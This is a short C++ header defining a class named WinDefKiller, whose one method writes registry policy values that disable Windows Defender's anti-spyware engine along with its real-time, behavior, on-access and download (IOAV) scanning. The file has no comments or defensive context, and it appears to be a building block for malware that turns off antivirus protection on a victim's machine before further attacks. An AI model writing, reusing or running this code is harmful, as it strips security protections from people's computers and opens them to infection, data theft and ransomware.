#pragma once
#include <Windows.h>

class WinDefKiller {
public:
	bool killWinDefender() {
        HKEY key;
        HKEY new_key;
        DWORD disable = 1;

        LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &key);
        if (res == ERROR_SUCCESS) {
            RegSetValueEx(key, L"DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
            RegCreateKeyEx(key, L"Real-Time Protection", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &new_key, 0);
            RegSetValueEx(new_key, L"DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
            RegSetValueEx(new_key, L"DisableBehaviorMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
            RegSetValueEx(new_key, L"DisableScanOnRealtimeEnable", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
            RegSetValueEx(new_key, L"DisableOnAccessProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
            RegSetValueEx(new_key, L"DisableIOAVProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));

            RegCloseKey(key);
            RegCloseKey(new_key);
            return true;
        }
        return false;
	}
};